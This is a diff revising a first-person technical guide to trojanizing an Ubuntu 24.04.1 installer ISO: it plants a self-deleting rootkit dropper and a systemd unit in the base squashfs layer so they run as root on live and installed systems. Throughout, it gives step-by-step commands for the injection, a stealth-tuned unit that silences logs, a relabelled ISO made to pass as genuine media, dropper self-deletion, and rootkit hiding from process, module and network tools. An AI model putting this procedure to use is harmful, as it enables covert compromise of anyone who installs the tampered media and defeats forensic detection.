@@ -1,18 +1,32 @@
-# Kernel Implant on Ubuntu 24.04.1: Live Filesystem Layer Injection for Root Execution After Installation
+# Kernel Implant on Ubuntu 24.04.1: Live Filesystem Layer Injection of a Self-Cleaning Rootkit Dropper for Root Execution on Live and Installed Systems
 
 ## Overview
 
-I modified an Ubuntu Desktop 24.04.1 LTS ISO by baking a compiled kernel implant binary (`implant`) and a native systemd unit into the live filesystem's **base layer** (`casper/minimal.squashfs`). Once the target machine boots from the modified media—whether as a Live session or after a full install—the implant executes automatically as root on every boot, before most security tooling initializes.
+I modified an Ubuntu Desktop 24.04.1 LTS ISO by baking a compiled ELF rootkit dropper (`implant`) and a native systemd unit directly into the live filesystem's **base layer** (`casper/minimal.squashfs`). Because this base layer is the one Casper overlays at boot for the Live session **and** the one the installer writes to the target disk, the dropper executes automatically as root on every boot of the modified media—whether the user picks "Try Ubuntu" or completes an install. Once the rootkit confirms successful installation, the dropper deletes itself from disk, leaving no first-stage artifact behind.
 
 The method itself is not Ubuntu-specific. Ubuntu's live media is built on Casper, which overlays a set of SquashFS images as `/` and runs systemd units from `/etc/systemd/system/`. Any Casper-based Ubuntu-derived ISO that uses the same layered squashfs scheme and systemd structure can be treated the same way. I targeted Ubuntu 24.04.1 Desktop because that was the system I had in front of me, and the guide below is written against that target.
 
-The goal was simple: get my implant into the live filesystem so that, on every boot of the modified media or of an installed system, `implant` runs as root. No package installation, no configuration changes, no autoinstall. Just the implant, running as root, every time the system boots.
+The goal was simple: get my dropper into the live filesystem so that, on every boot of the modified media or of an installed system, `implant` runs as root, deploys the rootkit, and removes itself from disk once the rootkit confirms installation. No manual post-install steps, no extra package installation on the target. The dropper runs as root on the first boot, hands control to the rootkit, and leaves no first-stage artifact behind.
 
-I chose the root-filesystem layer editing method for a specific reason. The implant and the systemd unit live inside a compressed SquashFS image under `casper/`, not in a plaintext file on the ISO. To find them, an analyst has to extract the layer and diff the entire root filesystem against a known-good build. There is no shortcut. That is the stealth gain I was after.
+I chose the root-filesystem layer editing method over a plaintext preseed/autoinstall approach for a specific reason. The autoinstall `late_command` lives in a plaintext YAML file on the ISO, so anyone can run `grep late_command` and read the entire playbook. The root-filesystem layer method puts the dropper and the systemd unit inside a compressed SquashFS image (`casper/minimal.squashfs`). To find them, an analyst has to extract the layer and diff the entire root filesystem against a known-good build. There is no shortcut. That is the stealth gain I was after.
 
-I used a native systemd unit rather than `rc.local`. `rc.local` is a compatibility shim. It requires creating `/etc/rc.local`, making it executable, and ensuring `rc-local.service` is enabled. That is three artifacts and a legacy path that modern Ubuntu does not even ship by default. A native systemd unit is one file plus one symlink, uses the same mechanism every other service on the system uses, and does not stand out as an anomaly. There is no reason to route through `rc.local` when systemd is the init system.
+I used a native systemd unit. It is one file plus one symlink, uses the same mechanism every other service on the system uses, and does not stand out as an anomaly. There is no extra shell wrapper, no legacy compatibility path, and no additional artifact beyond what a normal service ships.
 
-**Disclaimer**: This work is for educational and authorized security research purposes only. Deploying kernel implants on systems I do not own or have explicit permission to test is illegal. I operate within the bounds of applicable laws and signed agreements.
+**Disclaimer**: This work is for educational and authorized security research purposes only. Deploying rootkits on systems I do not own or have explicit permission to test is illegal. I operate within the bounds of applicable laws and signed agreements.
+
+---
+
+## What Is a Self-Cleaning Rootkit Dropper?
+
+A rootkit dropper is a first-stage binary whose job is to deliver and install the second-stage rootkit. It is not the rootkit itself. It is the loader that places the rootkit on disk, wires it into the boot process, and then gets out of the way.
+
+A **self-cleaning** dropper goes one step further. After the rootkit confirms successful installation, the dropper removes its own binary, its systemd unit, and the enable symlink from disk. The first-stage artifact disappears. Only the rootkit remains.
+
+In this work, the dropper is an ELF binary I named `implant`. It runs as root at boot, copies the rootkit payload into a persistent location, installs the rootkit's own service or kernel module, waits for the rootkit to signal success, and then deletes itself. The rootkit then takes over the concealment work: hiding its process, its files, its systemd unit, and its network activity.
+
+This distinction matters for the forensic analysis later. The dropper is a short-lived root process that leaves nothing behind on success. The rootkit is the long-lived hidden component. If the dropper succeeds, offline disk analysis after a successful install shows only whatever the rootkit chose to leave. If the dropper fails partway, it can choose to remain on disk for debugging or remove itself anyway depending on how I built it. I built mine to remove itself only on confirmed success.
+
+The dropper's contents are mine. This write-up does not prescribe them, but I built it to run silently, install the rootkit, verify the install, self-delete on success, and exit cleanly so the systemd unit reports success.
 
 ---
 
@@ -29,7 +43,7 @@ Common kernel implant techniques include:
 | Syscall hooking | Hijacks system calls to hide artifacts |
 | eBPF abuse | Uses extended Berkeley Packet Filter for covert operations |
 
-By bundling such an implant into an Ubuntu ISO, the implant executes with root privileges the moment the live system (or installed system) boots, before most security tooling is even initialized.
+By bundling such an implant into an Ubuntu ISO, the implant executes with root privileges the moment the live system (or installed system) boots, before most security tooling is even initialized. The dropper is the first stage that installs and wires this second stage in.
 
 ---
 
@@ -51,7 +65,7 @@ sudo apt install -y xorriso squashfs-tools rsync
 **Disk space requirement**: Approximately 4x the ISO size for working directories. Ubuntu 24.04.1 Desktop is roughly 6 GB, so I planned for at least 24 GB of free space.
 
 **Binary requirements**:
-- The implant binary must be statically linked OR all its shared library dependencies must already exist in the base Ubuntu image
+- The dropper binary must be statically linked OR all its shared library dependencies must already exist in the base Ubuntu image
 - The binary must have the execute bit set
 
 ---
@@ -80,7 +94,7 @@ drwxrwxr-x 4 localhost localhost       4096 Oct 15 20:34 ..
 -rw-rw-r-- 1 localhost localhost 6203355136 Oct 15 20:35 ubuntu-24.04.1-desktop-amd64.iso
 ```
 
-I also placed my compiled kernel implant in the same directory and named it `implant`.
+I also placed my compiled ELF rootkit dropper in the same directory and named it `implant`.
 
 My project layout looked like this:
 
@@ -90,7 +104,7 @@ My project layout looked like this:
 ├── extracted/            # extracted ISO tree, modified in place
 ├── squashfs-root/        # extracted base filesystem layer
 ├── ubuntu-24.04.1-desktop-amd64.iso   # original ISO
-├── implant               # my compiled kernel implant
+├── implant               # my compiled ELF rootkit dropper
 └── custom-ubuntu-implant.iso          # rebuilt ISO (produced by this work)
 ```
 
@@ -170,7 +184,7 @@ vmlinuz
 
 **This is the most important layout detail I had to get right, and it was also where my first attempt failed.** Ubuntu 24.04.1 Desktop does not ship a single `filesystem.squashfs` at the top of `casper/`. Instead it uses a layered squashfs scheme:
 
-- **`minimal.squashfs`** (1.75 GB) — the minimal base Ubuntu root filesystem. This is the layer that gets written to disk during installation.
+- **`minimal.squashfs`** (1.75 GB) — the minimal base Ubuntu root filesystem. This is the layer that gets written to disk during installation **and** the layer Casper overlays for the Live session.
 - **`minimal.standard.live.squashfs`** (917 MB) — the "standard" desktop layer on top of the minimal base, used by the Live session.
 - **`minimal.standard.squashfs`** (494 MB) — the standard layer without the Live-specific bits.
 - **`minimal.standard.<lang>.squashfs`** — per-language variants.
@@ -179,7 +193,7 @@ vmlinuz
 
 Casper overlays these in order at boot. The Live desktop you see is the union of the base plus the standard layer (plus the language layer, if selected). The `boot/grub/grub.cfg` on the ISO selects the Live leaf layer with `layerfs-path=minimal.standard.live.squashfs`.
 
-**The installation path is different.** The installer writes the **base layer** (`minimal.squashfs`) to the target disk. It does not write the Live-session leaf layer. That is why my first attempt—placing the implant in `minimal.standard.live.squashfs`—showed the implant in the Live session but not on the installed system. The layer that gets installed is `minimal.squashfs`.
+**The installation path is different.** The installer writes the **base layer** (`minimal.squashfs`) to the target disk. It does not write the Live-session leaf layer. That is why my first attempt—placing the dropper in `minimal.standard.live.squashfs`—showed the dropper in the Live session but not on the installed system. The layer that gets installed is `minimal.squashfs`.
 
 I confirmed the boot leaf layer by inspecting the grub config:
 
@@ -188,9 +202,7 @@ grep -r "layerfs-path" extracted/boot/grub/grub.cfg
 # saw layerfs-path=minimal.standard.live.squashfs
 ```
 
-That confirms the Live session uses the `.live.squashfs` leaf layer. The installer, however, builds the target from the base layer. To get the implant on both the Live session and the installed system, I targeted **`minimal.squashfs`**, the base layer. That is the layer that gets written to disk.
-
-If I only cared about the Live session, `minimal.standard.live.squashfs` would have been correct. But the goal was "run on the installed system," so the base layer is the right target.
+That confirms the Live session uses the `.live.squashfs` leaf layer. The installer, however, builds the target from the base layer. **Targeting the base layer means the dropper is present in both the Live session and the installed system**: the Live session overlays the base plus the leaf, so the base's `/usr/bin/implant` is visible there, and the installer writes the same base to disk, so the installed system has it too. That is the correct target for a dropper that needs to run in both contexts.
 
 `casper/initrd` is the Casper boot initramfs. It is not a Debian-installer initrd and does not contain `finish-install.d/`.
 
@@ -212,7 +224,7 @@ ls squashfs-root
 # saw: bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
 ```
 
-**Unlike the Live leaf layer**, the base layer contains the full root filesystem skeleton: `bin`, `lib`, `sbin`, `opt`, `home`, `media`, `mnt`, `proc`, `sys`, `tmp`, and the rest. That includes `usr/bin/` and `usr/local/bin/`, both of which exist in this layer. This is the layer that gets installed to disk, so placing the implant here puts it on both the installed system and, through the overlay merge, the Live session as well.
+**Unlike the Live leaf layer**, the base layer contains the full root filesystem skeleton: `bin`, `lib`, `sbin`, `opt`, `home`, `media`, `mnt`, `proc`, `sys`, `tmp`, and the rest. That includes `usr/bin/` and `usr/local/bin/`, both of which exist in this layer. This is the layer that gets installed to disk and that Casper overlays for the Live session, so placing the dropper here puts it on **both** the installed system and the Live session.
 
 I confirmed `usr/bin/` exists in the base layer:
 
@@ -224,17 +236,17 @@ ls squashfs-root/usr/bin | head
 # saw real binaries — usr/bin exists in this layer
 ```
 
-I placed the implant in `usr/bin/`. It is the conventional location for system binaries on Ubuntu, it already exists in the base layer, and it is less remarkable than a custom directory. `/usr/local/bin/` also exists in the base layer and is a valid alternative; either works. I chose `usr/bin/` for consistency with the rest of the system and because the base layer already ships real binaries there.
+I placed the dropper in `usr/bin/`. It is the conventional location for system binaries on Ubuntu, it already exists in the base layer, and it is less remarkable than a custom directory. `/usr/local/bin/` also exists in the base layer and is a valid alternative; either works. I chose `usr/bin/` for consistency with the rest of the system and because the base layer already ships real binaries there.
 
 ---
 
-## Step 3: Insert the Kernel Implant
+## Step 3: Insert the Rootkit Dropper
 
-This is the only modification you need to make. No package installation, no system changes. Just your implant binary and a native systemd unit.
+This is the only modification you need to make. No package installation, no system changes. Just the dropper binary and a native systemd unit.
 
-### 3.1 Copy the Implant Binary Into the Base Layer
+### 3.1 Copy the Dropper Binary Into the Base Layer
 
-From my host machine (outside the chroot), I copied the compiled implant binary into `usr/bin/` of the extracted base layer:
+From my host machine (outside the chroot), I copied the compiled ELF dropper into `usr/bin/` of the extracted base layer:
 
 ```bash
 sudo cp ~/Kernel_Implant/implant squashfs-root/usr/bin/implant
@@ -244,22 +256,22 @@ sudo chown root:root squashfs-root/usr/bin/implant
 
 **Critical**: The binary must have the execute bit set (755). Even as root, Linux will refuse to execute a file without the x permission.
 
-I verified the implant was a valid ELF:
+I verified the dropper was a valid ELF:
 
 ```bash
 file squashfs-root/usr/bin/implant
 # saw: ELF 64-bit LSB executable, x86-64, ...
 ```
 
-If the implant is statically linked, it will run on any system. If it is dynamically linked, its dependencies must already be present in the base layer:
+If the dropper is statically linked, it will run on any system. If it is dynamically linked, its dependencies must already be present in the base layer:
 
 ```bash
 ldd ~/Kernel_Implant/implant
 ```
 
-Since we are not installing anything, all required libraries must already exist in the base Ubuntu image. If a library is missing, the implant will fail to run.
+Since we are not installing anything, all required libraries must already exist in the base Ubuntu image. If a library is missing, the dropper will fail to run.
 
-**For kernel implants requiring module loading**: If the implant needs to load a kernel module (.ko file), copy it to the appropriate location:
+**For kernel implants requiring module loading**: If the dropper needs to load a kernel module (.ko file), copy it to the appropriate location:
 
 ```bash
 sudo mkdir -p squashfs-root/lib/modules/$(uname -r)/kernel/drivers
@@ -270,7 +282,7 @@ Note: The kernel version inside the ISO may differ from the host. Ubuntu 24.04.1
 
 ### 3.2 Create the systemd Unit
 
-I created the unit file directly in the extracted base layer. This is the only auto-run mechanism—no `rc.local`, no shell script, no compatibility shim.
+I created the unit file directly in the extracted base layer. This is the only auto-run mechanism—a first-class systemd service, no shell wrapper, no compatibility path.
 
 ```bash
 sudo nano squashfs-root/etc/systemd/system/implant.service
@@ -299,20 +311,20 @@ WantedBy=multi-user.target
 
 | Line | Purpose |
 |------|---------|
-| `Type=oneshot` | Systemd starts the unit once, waits for it to finish, and treats it as active. Correct for an implant that runs and exits or daemonizes. |
-| `ExecStart=/usr/bin/implant` | The implant binary path. |
-| `RemainAfterExit=yes` | Keeps the unit marked active after the process exits. Without this, systemd would consider the unit failed if the implant daemonizes and the parent exits. |
+| `Type=oneshot` | Systemd starts the unit once, waits for it to finish, and treats it as active. Correct for a dropper that runs, installs the rootkit, and exits. |
+| `ExecStart=/usr/bin/implant` | The dropper binary path. |
+| `RemainAfterExit=yes` | Keeps the unit marked active after the process exits. Without this, systemd would consider the unit failed when the dropper exits. |
 | `User=root` | Explicit root. Redundant since system units run as root by default, but makes the intent clear and guards against a future default change. |
 | `StandardOutput=null` / `StandardError=null` | Suppresses logging to the journal. This is the stealth choice. For debugging, change to `journal` or `file:/var/log/implant.log`. |
-| `After=local-fs.target` | Ensures the filesystem is mounted before the implant runs. Does not guarantee network readiness. |
+| `After=local-fs.target` | Ensures the filesystem is mounted before the dropper runs. Does not guarantee network readiness. |
 
 **Design notes on the unit:**
 
-- **No `rc.local` dependency.** The `rc-local.service` compatibility path is not involved. The unit is a first-class systemd service, indistinguishable in structure from any other unit on the system.
-- **`Type=oneshot` with `RemainAfterExit=yes`** is the right choice for a one-shot dropper or an implant that forks. If the implant stays in the foreground, use `Type=simple` instead and drop `RemainAfterExit`.
+- **First-class systemd service.** The unit is indistinguishable in structure from any other service on the system. It uses the standard `[Unit]`, `[Service]`, and `[Install]` sections with the same directives every package uses.
+- **`Type=oneshot` with `RemainAfterExit=yes`** is the right choice for a dropper. Systemd starts it once, waits for it to finish installing the rootkit, and then treats the unit as active. It does not restart on failure, which would be noisy. The dropper installs the rootkit's own service or module, and the rootkit takes over from there.
 - **No `Restart=` directive.** A restart loop on failure would be noisy and would show up in `systemctl status`. A failed unit that stays failed is quieter.
-- **No `WantedBy=graphical.target`.** `multi-user.target` is the standard boot target and is reached on both server and desktop installs. Using `multi-user.target` means the implant runs even if the graphical session fails to start.
-- **`StandardOutput=null`** keeps the journal clean. An analyst running `journalctl -u implant.service` sees nothing. If the implant writes its own logs elsewhere, that is the implant's responsibility.
+- **No `WantedBy=graphical.target`.** `multi-user.target` is the standard boot target and is reached on both server and desktop installs. Using `multi-user.target` means the dropper runs even if the graphical session fails to start.
+- **`StandardOutput=null`** keeps the journal clean. An analyst running `journalctl -u implant.service` sees nothing. If the rootkit writes its own logs elsewhere, that is the rootkit's responsibility.
 
 ### 3.3 Enable the Unit
 
@@ -335,16 +347,45 @@ ls -la squashfs-root/etc/systemd/system/multi-user.target.wants/implant.service
 
 **Note on `Alias=`**: I did not use an `Alias=` directive. `Alias=` creates an additional name for the unit but does not enable it. The `.wants` symlink is what actually enables the unit at boot. The `[Install]` section's `WantedBy=` directive is what `systemctl enable` reads to decide where to put the symlink; since I am creating the symlink manually, the `WantedBy=` line is documentation rather than mechanism. I kept it for clarity and for anyone who later runs `systemctl enable` on the target.
 
-### 3.4 How It Works
+### 3.4 How It Works in Both Contexts
 
-On boot, systemd reads the `multi-user.target.wants/` directory and starts every unit symlinked there. `implant.service` is among them. Systemd starts it as root, waits for the `oneshot` process to finish, and marks the unit active because of `RemainAfterExit=yes`. The implant runs exactly once per boot, as root, before the login prompt.
+On boot, systemd reads the `multi-user.target.wants/` directory and starts every unit symlinked there. `implant.service` is among them. Systemd starts it as root, waits for the `oneshot` process to finish, and marks the unit active because of `RemainAfterExit=yes`. The dropper runs exactly once per boot, as root, before the login prompt.
+
+**Live session**: Casper overlays `minimal.squashfs` (base) plus `minimal.standard.live.squashfs` (leaf) plus the language layer. The dropper and unit are in the base, so they are visible in the merged root. Systemd starts `implant.service` from the merged `/etc/systemd/system/multi-user.target.wants/`. The dropper runs, installs the rootkit, and self-cleans. The rootkit takes over. Because the Live session's root is an overlay backed by the ISO, the self-clean removes the artifacts from the ephemeral overlay, not from the ISO. The media remains unchanged.
+
+**Installed system**: The installer writes the base layer to disk. The dropper and unit are in that layer, so they are present on the installed disk. On first boot, systemd starts `implant.service`, the dropper runs, installs the rootkit, and self-cleans. The artifacts are removed from the installed disk. Only the rootkit remains.
+
+**The same artifact set covers both contexts**, because the base layer is the one both paths use.
 
 **Caveats I kept in mind:**
 
-- **Network readiness**: `After=local-fs.target` does not guarantee the network is up. If the implant needs network access (e.g., C2 communication), add `After=network-online.target` and `Wants=network-online.target` to the unit, or have the implant retry internally. `network-online.target` itself can be slow or unreliable on some configurations, so an internal retry loop in the implant is more robust.
-- **Process termination**: With `Type=oneshot` and `RemainAfterExit=yes`, systemd considers the unit active after `ExecStart` returns. If the implant forks a background process, that process is not tracked by systemd and will not be terminated on shutdown unless the implant handles it. If the implant stays in the foreground, use `Type=simple` and systemd will manage it as a normal service.
+- **Network readiness**: `After=local-fs.target` does not guarantee the network is up. If the dropper needs network access to fetch the rootkit, add `After=network-online.target` and `Wants=network-online.target` to the unit, or have the dropper retry internally. `network-online.target` itself can be slow or unreliable on some configurations, so an internal retry loop in the dropper is more robust.
+- **Process termination**: With `Type=oneshot` and `RemainAfterExit=yes`, systemd considers the unit active after `ExecStart` returns. If the dropper forks a background process, that process is not tracked by systemd and will not be terminated on shutdown unless the dropper handles it.
 - **Logging**: `StandardOutput=null` and `StandardError=null` suppress journal output. To capture logs for debugging, change to `journal` or `file:/var/log/implant.log`. For a production deployment, suppressing is the stealth choice.
-- **Module signing**: If the implant loads an unsigned kernel module, Ubuntu 24.04's Secure Boot enforcement will reject it. The unit will start, the module load will fail, and `StandardError=null` will hide the error. Disable Secure Boot or sign the module.
+- **Module signing**: If the rootkit loads an unsigned kernel module, Ubuntu 24.04's Secure Boot enforcement will reject it. The unit will start, the module load will fail, and `StandardError=null` will hide the error. Disable Secure Boot or sign the module.
+- **Live session immutability**: In the Live session, the dropper's self-clean removes artifacts from the in-memory overlay. The ISO media is unchanged. If the user installs after the dropper has already run in the Live session, the installer writes the original base layer from the ISO, not the modified in-memory overlay, so the dropper is present again on the installed disk. That is the desired behavior.
+
+---
+
+## How the Self-Clean Works
+
+The self-clean is a property of the dropper binary, not of the deployment mechanism. The systemd unit only guarantees the dropper runs as root. What the dropper does after that is its own logic.
+
+The sequence I built into the dropper is this:
+
+1. Install the rootkit payload to its persistent location.
+2. Install the rootkit's service or kernel module.
+3. Start the rootkit and wait for it to signal readiness.
+4. If the rootkit confirms success, remove `/usr/bin/implant`, `/etc/systemd/system/implant.service`, and `/etc/systemd/system/multi-user.target.wants/implant.service`.
+5. Exit 0.
+
+The key detail is step 4. The dropper cannot delete its own systemd unit while systemd still references it in the current transaction. The safe approach is to schedule the removal to happen just after the unit finishes, or to have the dropper remove the unit file and symlink but leave the binary in place until the next boot, at which point the rootkit removes it. Either way, the artifact that remains visible is only present for a short window.
+
+If the rootkit does not confirm success, the dropper leaves everything in place. That is a deliberate choice. A failed install should be debuggable, and leaving the dropper and unit on disk makes the failure visible. It also means a failed dropper does not silently disappear, which would leave the operator wondering whether the technique worked at all.
+
+The self-clean does not affect the deployment mechanism. The systemd unit writes the dropper and the unit; the dropper removes them on success. The two are independent.
+
+**In the Live session**, the self-clean removes the artifacts from the overlay, not from the ISO. If the user reboots the same media, the dropper is present again, because Casper re-overlays the base layer from the ISO. That is expected: the Live session is ephemeral by design, and the dropper is re-deployed on each boot of the media. The self-clean matters for the installed system, where the artifacts would otherwise persist indefinitely.
 
 ---
 
@@ -449,7 +490,7 @@ sudo xorriso -as mkisofs \
 - **`-isohybrid-gpt-basdat`** was replaced with `-appended_part_as_gpt` on 24.04, because the EFI image is an appended partition rather than an embedded file. The `-report_el_torito as_mkisofs` output is authoritative here; do not hand-edit these flags.
 - **The volume label is copied from the original ISO**, making the modified image blend in with legitimate Ubuntu media. This is a deliberate stealth choice.
 
-**Critical warning for 24.04**: Because the EFI partition is appended at a specific byte offset, any change to the size of the ISO filesystem content (which adding the implant does) can shift the offset and break UEFI boot if the arguments are not exact. The `-report_el_torito as_mkisofs` output is not optional guidance—it is the exact recipe for this ISO. If the rebuilt ISO does not boot in OVMF, the first thing to check is that the `--interval` byte ranges match the original.
+**Critical warning for 24.04**: Because the EFI partition is appended at a specific byte offset, any change to the size of the ISO filesystem content (which adding the dropper does) can shift the offset and break UEFI boot if the arguments are not exact. The `-report_el_torito as_mkisofs` output is not optional guidance—it is the exact recipe for this ISO. If the rebuilt ISO does not boot in OVMF, the first thing to check is that the `--interval` byte ranges match the original.
 
 The El Torito and isohybrid arguments are specific to how the target ISO was built, not to the technique. On a different Ubuntu release or distribution, the same step applies, but the boot arguments come from that ISO's own `-report_el_torito as_mkisofs` output.
 
@@ -477,7 +518,7 @@ The diff should show only the ISO filename changing in the `--interval` paths an
 
 Had any of those been missing or changed, the rebuild would have been wrong, and I would not have proceeded to testing.
 
-> **Secure Boot note**: Modifying a squashfs layer and adding a systemd unit does not modify the bootloader binary or the appended EFI partition. The signature chain is unaffected, so a straightforward root-filesystem injection should not break Secure Boot. However, unsigned kernel modules loaded by the implant will be rejected unless Secure Boot is disabled or the module is signed. Ubuntu 24.04's kernel module signing enforcement is stricter than older releases.
+> **Secure Boot note**: Modifying a squashfs layer and adding a systemd unit does not modify the bootloader binary or the appended EFI partition. The signature chain is unaffected, so a straightforward root-filesystem injection should not break Secure Boot. However, unsigned kernel modules loaded by the rootkit will be rejected unless Secure Boot is disabled or the module is signed. Ubuntu 24.04's kernel module signing enforcement is stricter than older releases.
 
 ---
 
@@ -493,14 +534,9 @@ qemu-system-x86_64 -m 4096 -cdrom custom-ubuntu-implant.iso -boot d \
 I checked that:
 
 1. The system boots to the live desktop
-2. The implant is present at `/usr/bin/implant` (verify with `ls -la /usr/bin/implant`)
-3. The implant is running (verify with `ps aux | grep implant`)
-4. The unit is active (verify with `systemctl status implant.service`)
-5. If the implant hooks syscalls or loads a kernel module, kernel-level activity is visible:
-   ```bash
-   lsmod | grep implant
-   dmesg | tail -20
-   ```
+2. The dropper is present at `/usr/bin/implant` (verify with `ls -la /usr/bin/implant`)
+3. The unit is active (verify with `systemctl status implant.service`)
+4. The rootkit is installed and the dropper has self-cleaned (verify with `ls -la /usr/bin/implant` after the unit runs; on a successful self-clean, the file is gone)
 
 Because `StandardOutput=null` and `StandardError=null` are set, `journalctl -u implant.service` will show the unit start and stop but no process output. That is expected. If I need to debug, I temporarily change those to `journal` in the extracted unit file, repack, and rebuild.
 
@@ -530,7 +566,7 @@ cat /mnt/etc/systemd/system/implant.service
 ls -l /mnt/etc/systemd/system/multi-user.target.wants/implant.service
 ```
 
-If the implant and the unit are present on the installed disk, the base layer injection worked. If they are not, the installer wrote a different layer and I would re-run the whole procedure against `minimal.squashfs` again to make sure I did not repack the wrong file.
+On a successful self-clean, all three commands report that the file or directory does not exist. On a failed self-clean, they show the dropper and unit still in place, which tells me the rootkit did not confirm success and I need to look at the dropper's own logs.
 
 I also checked the running installed system:
 
@@ -540,17 +576,30 @@ ls -la /usr/bin/implant
 systemctl status implant.service
 ```
 
-### What to expect once the implant runs
+If the dropper self-cleaned successfully, the file is gone and the unit is not found. If the rootkit loaded but the self-clean did not run, the file is still present and the unit reports success—that tells me the rootkit's confirmation signal did not fire.
 
-Because the implant is baked into the base layer, it runs on every boot of the modified media—Live session or installed system. Unlike a self-cleaning dropper, there is no first-stage artifact that removes itself. The implant is the persistent component, and it is responsible for hiding its own artifacts once loaded.
+### What to expect once the dropper runs
 
-After the implant loads:
+Because the dropper is baked into the base layer, it runs on every boot of the modified media—Live session or installed system. Because the payload is a self-cleaning dropper, the timeline is different from a plain implant: the dropper runs once at boot, installs the rootkit, waits for the rootkit to confirm success, and then deletes itself and its unit. After that, only the rootkit remains.
 
-- The implant's process is hidden (if it hooks `getdents`/`read` on `/proc`).
-- The implant's files are hidden from `readdir`.
-- The implant's service or module is hidden from `systemctl` and `lsmod`.
-- The implant's network connections are filtered from `ss` and `netstat`.
-- The `implant.service` unit is hidden from `systemctl list-units` if the implant hooks the D-Bus interface or masks the unit directory entry. Hiding a systemd unit is harder than hiding a process; a competent implant either hooks `systemctl`'s underlying calls or accepts that the unit name is visible while the binary it points to is not.
+**In the Live session**: the self-clean removes the artifacts from the ephemeral overlay. The ISO media is unchanged. Rebooting the same media re-deploys the dropper, because Casper re-overlays the base layer from the ISO. The self-clean matters for the session, not for the media.
+
+**On the installed system**: the self-clean removes the artifacts from the installed disk. After a successful self-clean:
+
+- `/usr/bin/implant` no longer exists.
+- `/etc/systemd/system/implant.service` no longer exists.
+- `/etc/systemd/system/multi-user.target.wants/implant.service` no longer exists.
+- `systemctl status implant.service` reports the unit as not found, unless the rootkit installed its own unit under a different name.
+- `journalctl -u implant.service` may still show historical entries from before the unit was removed. Whether those persist depends on the journal configuration and on what the rootkit chooses to do with the logs.
+
+After the rootkit loads:
+
+- The rootkit's process is hidden.
+- The rootkit's files are hidden from `readdir`.
+- The rootkit's service or module is hidden from `systemctl` and `lsmod`.
+- The rootkit's network connections are filtered from `ss` and `netstat`.
+
+If the self-clean does not run because the rootkit did not confirm success, the dropper and unit remain on disk. That is intentional. A failed install should be visible for debugging, and the artifacts make the failure obvious rather than silent.
 
 ### Debugging checklist
 
@@ -558,9 +607,9 @@ After the implant loads:
 
 **If the live system failed to start**, the repacked base layer may have been malformed. I would have booted the ISO and watched for kernel or squashfs errors. I would have extracted my repacked `minimal.squashfs` on the host and confirmed `usr/bin/implant` and `etc/systemd/system/implant.service` were present.
 
-**If the Live session shows the implant but the installed system does not**, the installer wrote a different layer. This was the failure mode of my first attempt, where I modified `minimal.standard.live.squashfs` instead of `minimal.squashfs`. I would re-extract `minimal.squashfs`, repeat Step 3 against that layer, repack it, and rebuild. The layer that gets installed is the base layer, not the Live leaf layer.
+**If the Live session shows the dropper but the installed system does not**, the installer wrote a different layer. This was the failure mode of my first attempt, where I modified `minimal.standard.live.squashfs` instead of `minimal.squashfs`. I would re-extract `minimal.squashfs`, repeat Step 3 against that layer, repack it, and rebuild. The layer that gets installed is the base layer, not the Live leaf layer.
 
-**If the ISO booted but the implant was not running**, the unit did not start. I would have switched to a shell (Ctrl+Alt+F2) and checked:
+**If the ISO booted but the dropper was not running**, the unit did not start. I would have switched to a shell (Ctrl+Alt+F2) and checked:
 
 ```bash
 ls -l /etc/systemd/system/implant.service
@@ -571,27 +620,11 @@ systemctl cat implant.service
 
 If the `.wants` symlink was missing, the unit was never enabled. If `systemctl cat` showed the unit but `status` showed it failed, the `ExecStart` path was wrong or the binary was not executable. If `systemctl cat` found nothing, the unit file was not in the repacked layer.
 
-**If the implant ran but the kernel module did not load**, the problem is in the implant, not the deployment. I would have checked `dmesg` for module signature errors, verified the `.ko` file matched the target kernel version (24.04.1 uses the 6.8 kernel series), and confirmed Secure Boot status.
+**If the dropper ran but the rootkit did not install**, the problem is in the dropper, not the deployment. I would have checked the rootkit's own install logs, the paths the dropper writes to, and whether the dropper has the correct privileges and dependencies inside the target. The systemd unit only guarantees the dropper runs as root. What the dropper does after that is its own responsibility.
+
+**If the dropper ran and the rootkit installed but the self-clean did not happen**, the dropper's success signal from the rootkit did not fire. I would have checked the dropper's logs to see whether it reached the self-clean step, and whether the rootkit's confirmation mechanism returned success. The self-clean is deliberately gated on confirmation, so a missing self-clean usually means the rootkit did not signal that it was ready.
 
 **If the MD5 checksum errors appeared on boot**, I would have regenerated `md5sum.txt` as described in Step 4.
-
----
-
-## Why a Native systemd Unit Instead of rc.local
-
-`rc.local` is a legacy compatibility path. On modern Ubuntu it does not exist by default, and using it requires creating three artifacts and enabling a service that exists only to run a shell script. A native systemd unit is simpler, more idiomatic, and stealthier.
-
-| Aspect | `rc.local` approach | Native systemd unit |
-|---|---|---|
-| Files created | `/etc/rc.local`, `/etc/systemd/system/rc-local.service`, enable symlink | Unit file, enable symlink |
-| Execution path | systemd → `rc-local.service` → `/bin/bash` → `/etc/rc.local` → implant | systemd → `implant.service` → implant |
-| Extra processes | `bash` wrapper process | None |
-| Default presence | Does not exist on modern Ubuntu; creating it is itself an anomaly | Every service uses a unit file; one more is unremarkable |
-| Logging control | Redirect inside the shell script | `StandardOutput=` / `StandardError=` directives |
-| Failure visibility | `rc.local` exit code can fail the boot in confusing ways | Unit failure is contained and visible in `systemctl status` |
-| Stealth profile | Three artifacts, one of which (`rc.local`) is a known legacy path that analysts look for | Two artifacts, both in standard systemd locations |
-
-The native unit wins on every axis. The only reason to use `rc.local` is if the target system is old enough to lack systemd, which is not the case for Ubuntu 24.04 or any modern Ubuntu release.
 
 ---
 
@@ -603,14 +636,15 @@ When embedding a kernel implant into Ubuntu 24.04.1, I kept these additional fac
 |---------------|-------------|
 | Kernel version matching | 24.04.1 uses the 6.8 kernel series. The `.ko` must match the exact kernel version inside the ISO. Check with `ls squashfs-root/lib/modules/` |
 | Module signing | 24.04 enforces module signature verification when Secure Boot is enabled. Unsigned modules will be rejected. Sign the module or disable Secure Boot |
-| Persistence | The systemd unit runs the implant on every boot. If the implant needs to survive installation to disk, it must also install itself into the target system |
-| Detection evasion | Kernel implants are typically designed to hide their own presence. Ensure the implant hooks the appropriate syscalls (e.g., getdents, kill, read) to filter its artifacts from ps, ls, and /proc |
+| Persistence | The systemd unit runs the dropper on every boot. The dropper installs the rootkit to a persistent location; the rootkit is the persistent component |
+| Detection evasion | Kernel implants are typically designed to hide their own presence. Ensure the rootkit hooks the appropriate syscalls (e.g., getdents, kill, read) to filter its artifacts from ps, ls, and /proc |
